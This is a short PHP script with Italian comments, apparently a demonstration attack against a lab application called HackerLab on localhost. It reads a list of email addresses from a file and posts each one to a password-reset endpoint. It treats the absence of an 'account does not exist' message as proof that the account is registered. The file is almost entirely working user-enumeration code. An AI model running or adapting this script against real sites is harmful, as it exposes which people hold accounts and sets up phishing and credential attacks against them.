<?php
/**
 * Filippo Finke
 * 
 * Script che permette di eseguire un attacco di tipo bruteforce alle email di HackerLab.
 */

 /**
 * L'url del percorso per il reset della password di HackerLab.
 */
define("URL", "http://127.0.0.1/reset");

/**
 * Metodo utilizzato per controllare se un email è presente su HackerLab.
 * 
 * @param String $email L'email.
 * @return Boolean True se l'email esiste, sennò false.
 */
function exists($email) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, URL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    // Imposto i campi richiesti dal percorso /reset
    curl_setopt($ch, CURLOPT_POSTFIELDS, "email=$email");
    // Metodo POST
    curl_setopt($ch, CURLOPT_POST, 1);
    // Imposto a curl di seguire i redirect
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_COOKIEFILE, "");
    $result = curl_exec($ch);
    curl_close($ch);
    unset($ch);
    // Controllo se è presente un errore oppure no.
    if(strpos($result, "Account inesistente!") !== false) {
        return false;
    }
    return true;
}


/**
 * Parte di lettura del file e controlli.
 */
echo PHP_EOL."[i] Dimostrazione di email checker di HackerLab".PHP_EOL;
echo "[i] Autore: Filippo Finke".PHP_EOL;

$emails = explode("\n", file_get_contents("emails.txt"));
$emailsCount = count($emails);
echo "[i] Caricate $emailsCount emails!".PHP_EOL;
foreach ($emails as $number => $email) {
    echo "[-] Email ".str_pad($email, 40, " ", STR_PAD_BOTH)." -> ";
    if (exists($email)) {
        echo "REGISTRATA!";
    } else {
        echo "INESISTENTE!";
    }
    echo " ($number/$emailsCount)".PHP_EOL;
}